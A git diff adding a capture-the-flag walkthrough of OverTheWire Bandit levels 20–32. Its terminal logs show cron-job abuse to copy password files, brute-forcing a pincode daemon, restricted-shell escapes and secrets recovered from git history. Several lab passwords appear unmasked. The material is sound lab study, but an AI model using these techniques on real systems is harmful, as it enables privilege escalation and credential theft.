@@ -501,5 +501,634 @@ There is a setuid binary in the homedirectory that does the following: it makes 
 
 **NOTE:** Try connecting to your own network daemon to see if it works as you think
 ```
+bandit20@bandit:~$ echo 4pIjcun--------------------7VhxD6pOA | nc -lvnp 12345
+Listening on 0.0.0.0 12345
+^Z
+[1]+  Stopped                    echo 4pIjcu-------------hxD6pOA | nc -lvnp 12345
+bandit20@bandit:~$ ./suconnect 12345
+^Z
+[2]+  Stopped                    ./suconnect 12345
+bandit20@bandit:~$ fg
+./suconnect 12345
+^Z
+[2]+  Stopped                    ./suconnect 12345
+bandit20@bandit:~$ jobs
+[1]-  Stopped                    echo 4pIjcun-------------hxD6pOA | nc -lvnp 12345
+[2]+  Stopped                    ./suconnect 12345
+bandit20@bandit:~$ fg 1
+-bash: fg: warning: 1: job specification requires leading `%'
+echo 4pIjcun--------------VhxD6pOA | nc -lvnp 12345
+Connection received on 127.0.0.1 56692
+^Z
+[1]+  Stopped                    echo 4pIjcu-----------f7VhxD6pOA | nc -lvnp 12345
+bandit20@bandit:~$ fg 2
+-bash: fg: warning: 2: job specification requires leading `%'
+./suconnect 12345
+Read: 4pIjcunZ------------------G8Vf7VhxD6pOA
+Password matches, sending next password
+bandit20@bandit:~$ fg 1
+-bash: fg: warning: 1: job specification requires leading `%'
+echo 4pIjcun---------------f7VhxD6pOA | nc -lvnp 12345
+bW9kBv5W------------------------ka6hY
+bandit20@bandit:~$ 
+
+
+```
+## Question 21
+A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
+```
+bandit21@bandit:~$ ls -l /etc/cron.d/*
+-r--r----- 1 root root  47 Jun 24 14:59 /etc/cron.d/behemoth4_cleanup
+-rw-r--r-- 1 root root 127 Jul  3 16:19 /etc/cron.d/clean_tmp
+-rw-r--r-- 1 root root 120 Jun 24 14:58 /etc/cron.d/cronjob_bandit22
+-rw-r--r-- 1 root root 122 Jun 24 14:58 /etc/cron.d/cronjob_bandit23
+-rw-r--r-- 1 root root 120 Jun 24 14:59 /etc/cron.d/cronjob_bandit24
+-rw-r--r-- 1 root root 188 Feb 13  2026 /etc/cron.d/e2scrub_all
+-r--r----- 1 root root  48 Jun 24 15:00 /etc/cron.d/leviathan5_cleanup
+-rw------- 1 root root 138 Jun 24 15:01 /etc/cron.d/manpage3_resetpw_job
+-rwx------ 1 root root  52 Jun 24 15:02 /etc/cron.d/otw-tmp-dir
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@bandit:~$ ^C
+bandit21@bandit:~$ ls -l /etc/cron.d/cronjob_bandit22
+-rw-r--r-- 1 root root 120 Jun 24 14:58 /etc/cron.d/cronjob_bandit22
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+RYVux2rHE---------------hx6AZQMEz
+bandit21@bandit:~
+
+```
+## Question 22
+A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
+
+**NOTE:** Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.
+```
+bandit22@bandit:~$ ls -l /etc/cron.d/*
+-r--r----- 1 root root  47 Jun 24 14:59 /etc/cron.d/behemoth4_cleanup
+-rw-r--r-- 1 root root 127 Jul  3 16:19 /etc/cron.d/clean_tmp
+-rw-r--r-- 1 root root 120 Jun 24 14:58 /etc/cron.d/cronjob_bandit22
+-rw-r--r-- 1 root root 122 Jun 24 14:58 /etc/cron.d/cronjob_bandit23
+-rw-r--r-- 1 root root 120 Jun 24 14:59 /etc/cron.d/cronjob_bandit24
+-rw-r--r-- 1 root root 188 Feb 13  2026 /etc/cron.d/e2scrub_all
+-r--r----- 1 root root  48 Jun 24 15:00 /etc/cron.d/leviathan5_cleanup
+-rw------- 1 root root 138 Jun 24 15:01 /etc/cron.d/manpage3_resetpw_job
+-rwx------ 1 root root  52 Jun 24 15:02 /etc/cron.d/otw-tmp-dir
+bandit22@bandit:~$ 
+
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe8ls1326349
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+gKXDTAXn----------------qutUlPZrBsw
+bandit22@bandit:~$ 
+
+```
+## Question 23
+A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
+
+**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+```
+# Script 1
+
+#!/bin/bash
+cp -r /var/spool/bandit24 /tmp/tmp.7EnFM53S1A
+chmod 777 /tmp/tmp.7EnFM53S1A/bandit24
+chmod 777 /tmp/tmp.7EnFM53S1A/bandit24/*
+```
+
+```
+# Script 2
+
+#!/bin/bash
+cp /etc/bandit_pass/bandit24 /tmp/tmp.7EnFM53S1A/bandit24.sh
+chmod 777 /tmp/tmp.7EnFM53S1A/bandit24.sh
+```
+
+```
+# Checking cron files
+bandit23@bandit:~$ ls -la /etc/cron.d/*
+-r--r----- 1 root root  47 Jun 24 14:59 /etc/cron.d/behemoth4_cleanup
+-rw-r--r-- 1 root root 127 Jul  3 16:19 /etc/cron.d/clean_tmp
+-rw-r--r-- 1 root root 120 Jun 24 14:59 /etc/cron.d/cronjob_bandit22
+-rw-r--r-- 1 root root 122 Jun 24 14:59 /etc/cron.d/cronjob_bandit23
+-rw-r--r-- 1 root root 120 Jun 24 14:59 /etc/cron.d/cronjob_bandit24
+-rw-r--r-- 1 root root 188 Feb 13  2026 /etc/cron.d/e2scrub_all
+-r--r----- 1 root root  48 Jun 24 15:01 /etc/cron.d/leviathan5_cleanup
+-rw------- 1 root root 138 Jun 24 15:01 /etc/cron.d/manpage3_resetpw_job
+-rwx------ 1 root root  52 Jun 24 15:03 /etc/cron.d/otw-tmp-dir
+
+
+# Checking perms
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+bandit23@bandit:~$ ls -la /usr/bin/cronjob_bandit24.sh
+-rwxr-x--- 1 bandit24 bandit23 438 Jun 24 14:59 /usr/bin/cronjob_bandit24.sh
+
+# Reading the script that cron runs.
+# The script goes into /var/spool/bandit24/foo directory, runs the scripts owned 
+# by bandit23 and deletes it.
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+shopt -s nullglob
+
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit 
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+done
+
+# Checking permissions of /var/spool/bandit24/foo. We can write and execute scripts
+# in /var/spool/bandit24/foo but not read or list the contents.
+
+bandit23@bandit:~$ mktemp -d
+/tmp/tmp.7EnFM53S1A
+bandit23@bandit:~$ cd /tmp/tmp.7EnFM53S1A
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ ls -la /var/spool/bandit24/foo
+ls: cannot open directory '/var/spool/bandit24/foo': Permission denied
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ ls -la /var/spool/bandit24
+total 12
+dr-xr-x--- 3 bandit24 bandit23 4096 Jun 24 14:59 .
+drwxr-xr-x 6 root     root     4096 Jun 24 15:03 ..
+drwxrwx-wx 3 root     bandit24 4096 Sep  1 06:32 foo
+
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ 
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ nano 1
+Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ chmod +x 1
+
+# Script 1
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ cat 1
+#!/bin/bash
+cp -r /var/spool/bandit24 /tmp/tmp.7EnFM53S1A
+chmod 777 /tmp/tmp.7EnFM53S1A/bandit
+chmod 777 /tmp/tmp.7EnFM53S1A/bandit/*
+
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ ls -la
+total 4
+drwx------  2 bandit23 bandit23   60 Sep  1 06:44 .
+drwxrwx-wt 67 root     root     1660 Sep  1 06:46 ..
+-rwxrwxr-x  1 bandit23 bandit23  134 Sep  1 06:44 1
+
+# Make the temp directory writable by bandit24
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ chmod 777 .
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ ls -la
+total 4
+drwxrwxrwx  2 bandit23 bandit23   60 Sep  1 06:44 .
+drwxrwx-wt 67 root     root     1660 Sep  1 06:47 ..
+-rwxrwxr-x  1 bandit23 bandit23  134 Sep  1 06:44 1
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ 
+
+
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ cp 1 /var/spool/bandit24/foo
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$
+
+# Inspecting after the cron runs our payload Script 1
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ ls -la
+total 4
+drwxrwxrwx  3 bandit23 bandit23   80 Sep  1 06:52 .
+drwxrwx-wt 71 root     root     1740 Sep  1 06:52 ..
+-rwxrwxr-x  1 bandit23 bandit23  138 Sep  1 06:49 1
+drwxrwxrwx  3 bandit24 bandit24   60 Sep  1 06:52 bandit24
+
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ ls -l bandit24/foo/
+total 4
+-rwxrwxr-x 1 bandit24 bandit24 138 Sep  1 06:52 1
+drwxrwxr-x 2 bandit24 bandit24  60 Sep  1 06:52 hackdir
+
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ ls -l bandit24/foo/hackdir/hack.sh
+-rwx---r-x 1 bandit24 bandit24 51 Sep  1 06:52 bandit24/foo/hackdir/hack.sh
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ 
+
+# Reading hack.sh file
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ ls -l bandit24/foo/hackdir/hack.sh
+-rwx---r-x 1 bandit24 bandit24 51 Sep  1 06:52 bandit24/foo/hackdir/hack.sh
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ cat bandit24/foo/hackdir/hack.sh
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ ls -l /etc/bandit_pass/bandit24
+-r-------- 1 bandit24 bandit24 33 Jun 24 14:58 /etc/bandit_pass/bandit24
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ 
+
+# hack.sh copies /etc/bandit_pass/bandit24 file.
+# We modify our script 1 to script 2 tp copy /etc/bandit_pass/bandit24 into cwd.
+
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ nano 2
+Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ chmod +x 2
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ cp 2 /var/spool/bandit24/foo
+
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ ls
+1  2  bandit24  bandit24.sh
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ cat bandit24.sh
+hVQMk3lJ-------------------om7BOgVXv
+bandit23@bandit:/tmp/tmp.7EnFM53S1A$ 
+```
+## Question 24
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
+You do not need to create new connections each time
+```
+bandit24@bandit:~$ for i in {1000..1002}; do echo hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i; done | nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+<SNIP>
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Correct!
+The password of user bandit25 is SoHfq------------------9a2Djx4P
+
+bandit24@bandit:~$ 
+```
+## Question 25
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.
+
+> NOTE: if you’re a Windows user and typically use Powershell to `ssh` into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.
+
+```
+# Enumerate Shell of Bandit26 from Bandit25
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ ls -l /usr/bin/showtext
+-rwxr-xr-x 1 root root 58 Jun 24 14:59 /usr/bin/showtext
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+bandit25@bandit:~$ 
+
+
+# If the terminal window is shrunk small enough before logging in, `more` cannot 
+# fit the entire text on one screen. It pauses at the bottom of the page and waits # for user input
+
+# SSH into Bandit26 when terminal shrinked to absolute mininum
+```
+![[Pasted image 20260902103149.png]]
+
+```
+# Press v to enter vi mode and then set shell variable as shown below
+```
+![[Pasted image 20260902103340.png]]
+
+```
+# Then do :shell to enter the shell
+```
+
+![[Pasted image 20260902103511.png]]
+
+## Question 26
+Good job getting a shell! Now hurry and grab the password for bandit27!
+
+```
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+STJLJBRRphMxKB392CT4iOr5CbzPU9ER
+bandit26@bandit:~$ 
+
+```
+
+## Question 27
+There is a git repository at `ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo` via the port `2220`. The password for the user `bandit27-git` is the same as for the user `bandit27`.
+
+From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
+
+```
+# Specify the port number 2220 after the FQDN.
+
+omen15@omen15:/tmp/tmp.kRTguRqld6$ git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
+Cloning into 'repo'...
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit27-git@bandit.labs.overthewire.org's password: 
+remote: Enumerating objects: 3, done.
+remote: Counting objects: 100% (3/3), done.
+remote: Compressing objects: 100% (2/2), done.
+remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (3/3), done.
+omen15@omen15:/tmp/tmp.kRTguRqld6$ ls
+repo
+omen15@omen15:/tmp/tmp.kRTguRqld6$ cd repo
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ ls
+README
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ cat README 
+The password to the next level is: y8Yd2ssKcp--------------RMzIGIeQ
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ 
+
+```
+
+## Question 28
+There is a git repository at `ssh://bandit28-git@bandit.labs.overthewire.org/home/bandit28-git/repo` via the port `2220`. The password for the user `bandit28-git` is the same as for the user `bandit28`.
+
+From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
+```
+omen15@omen15:/tmp/tmp.kRTguRqld6$ git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
+Cloning into 'repo'...
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit28-git@bandit.labs.overthewire.org's password: 
+remote: Enumerating objects: 9, done.
+remote: Counting objects: 100% (9/9), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (9/9), done.
+Resolving deltas: 100% (2/2), done.
+omen15@omen15:/tmp/tmp.kRTguRqld6$ ls
+repo
+omen15@omen15:/tmp/tmp.kRTguRqld6$ cd repo/
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ ls
+README.md
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ cat README.md 
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: xxxxxxxxxx
+
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ 
+
+# Looking at git logs and commit history
+
+men15@omen15:/tmp/tmp.kRTguRqld6/repo$ git log
+commit e2e1de5396037bafb23e9bb37c12ebea9b911cfd (HEAD -> master, origin/master, origin/HEAD)
+Author: Morla Porla <morla@overthewire.org>
+Date:   Wed Jun 24 14:59:20 2026 +0000
+
+    fix info leak
+
+commit 2678cfadd8f2a347bc23e1ea491f702e5b184709
+Author: Morla Porla <morla@overthewire.org>
+Date:   Wed Jun 24 14:59:20 2026 +0000
+
+    add missing data
+
+commit 9530d526c22b9e6e6ae11070ef8ff8ee21eb2e02
+Author: Ben Dover <noone@overthewire.org>
+Date:   Wed Jun 24 14:59:20 2026 +0000
+
+    initial commit of README.md
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ git show e2e1de5396037bafb23e9bb37c12ebea9b911cfd
+commit e2e1de5396037bafb23e9bb37c12ebea9b911cfd (HEAD -> master, origin/master, origin/HEAD)
+Author: Morla Porla <morla@overthewire.org>
+Date:   Wed Jun 24 14:59:20 2026 +0000
+
+    fix info leak
+
+diff --git a/README.md b/README.md
+index 42331d9..5c6457b 100644
+--- a/README.md
++++ b/README.md
+@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
+ ## credentials
+ 
+ - username: bandit29
+-- password: Em7eGtqaMySwNFjCpwzzHhLhospOcdt0
++- password: xxxxxxxxxx
+ 
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ 
+
+```
+
+## Question 29
+There is a git repository at `ssh://bandit29-git@bandit.labs.overthewire.org/home/bandit29-git/repo` via the port `2220`. The password for the user `bandit29-git` is the same as for the user `bandit29`.
+
+From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
+```
+# THe answer is present in another branch.
+# After cloning, we see that there are other branches. 
+# We want clone other branches as the README.md file in master branch didn't contain anything.
+
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ git branch -v -a
+* master                     b607fba fix username
+  remotes/origin/HEAD        -> origin/master
+  remotes/origin/dev         0bf8160 add data needed for development
+  remotes/origin/master      b607fba fix username
+  remotes/origin/sploits-dev a0e9e9c add some silly exploit, just for shit and giggles
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ 
+
+# Cloing dev branch
+omen15@omen15:/tmp/tmp.kRTguRqld6$ git clone -b dev ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
+Cloning into 'repo'...
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit29-git@bandit.labs.overthewire.org's password: 
+Permission denied, please try again.
+bandit29-git@bandit.labs.overthewire.org's password: 
+remote: Enumerating objects: 16, done.
+remote: Counting objects: 100% (16/16), done.
+remote: Compressing objects: 100% (11/11), done.
+remote: Total 16 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (16/16), done.
+Resolving deltas: 100% (2/2), done.
+omen15@omen15:/tmp/tmp.kRTguRqld6$ 
+
+
+
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ git branch -a -v
+* dev                        0bf8160 add data needed for development
+  remotes/origin/HEAD        -> origin/master
+  remotes/origin/dev         0bf8160 add data needed for development
+  remotes/origin/master      b607fba fix username
+  remotes/origin/sploits-dev a0e9e9c add some silly exploit, just for shit and giggles
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ ls
+code  README.md
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ cat README.md 
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: jq9Dfg------------------dH7USgX
+
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ 
+
+```
+
+## Question 30
+There is a git repository at `ssh://bandit30-git@bandit.labs.overthewire.org/home/bandit30-git/repo` via the port `2220`. The password for the user `bandit30-git` is the same as for the user `bandit30`.
+
+From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
+```
+# After cloning the repo, we check for hidden tags or references.
+
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ git show-ref
+929c564cd34ca667773e2eb02f74b514bc4eeebf refs/heads/master
+929c564cd34ca667773e2eb02f74b514bc4eeebf refs/remotes/origin/HEAD
+929c564cd34ca667773e2eb02f74b514bc4eeebf refs/remotes/origin/master
+6a76bc87a774031428feb5cc910568293c335545 refs/tags/secret
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ 
+
+
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ git show refs/tags/secret
+82Nkym-------------------stHpfUf
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ 
+
+```
+
+## Question 31
+There is a git repository at `ssh://bandit31-git@bandit.labs.overthewire.org/home/bandit31-git/repo` via the port `2220`. The password for the user `bandit31-git` is the same as for the user `bandit31`.
+
+From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
+```
+men15@omen15:/tmp/tmp.kRTguRqld6/repo$ cat README.md 
+This time your task is to push a file to the remote repository.
+
+Details:
+    File name: key.txt
+    Content: 'May I come in?'
+    Branch: master
+
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ echo 'May I come in?' > key.txt
+
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ git add key.txt 
+The following paths are ignored by one of your .gitignore files:
+key.txt
+hint: Use -f if you really want to add them.
+hint: Disable this message with "git config advice.addIgnoredFile false"
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ git add -f key.txt 
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ git commit -m "adding key file""
+> ^C
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ git commit -m "adding key file"
+[master fb65799] adding key file
+ 1 file changed, 1 insertion(+)
+ create mode 100644 key.txt
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ git push
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit31-git@bandit.labs.overthewire.org's password: 
+Enumerating objects: 6, done.
+Counting objects: 100% (6/6), done.
+Delta compression using up to 12 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (5/5), 489 bytes | 489.00 KiB/s, done.
+Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: ### Attempting to validate files... ####
+remote: 
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote: 
+remote: Well done! Here is the password for the next level:
+remote: pWuj5j----------------------8S1YvbT 
+remote: 
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote: 
+To ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo
+ ! [remote rejected] master -> master (pre-receive hook declined)
+error: failed to push some refs to 'ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo'
+omen15@omen15:/tmp/tmp.kRTguRqld6/repo$ 
+
+```
+
+## Question 32
+After all this `git` stuff, it’s time for another escape. Good luck!
+```
+bandit31@bandit:~$ ls
+bandit31@bandit:~$ cat /etc/passwd | grep bandit32
+bandit32:x:11032:11032:bandit level 32:/home/bandit32:/home/bandit32/uppershell
+bandit31@bandit:~$
+
+
+WELCOME TO THE UPPERCASE SHELL
+>> ls
+sh: 1: LS: Permission denied
+>> $SHELL
+WELCOME TO THE UPPERCASE SHELL
+>> $HOME
+sh: 1: /home/bandit32: Permission denied
+>> $PATH
+sh: 1: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: not found
+>> $1
+>> 1
+sh: 1: 1: Permission denied
+>> $2
+>> $0
+$ WHOAMI
+sh: 1: WHOAMI: Permission denied
+$ whoami
+bandit33
+$ /bin/bash -i
+bandit33@bandit:~$ cat /etc/bandit_pass/bandit33
+u4P2Cy--------------------vnFswM
+bandit33@bandit:~$ 
+
 
 ```
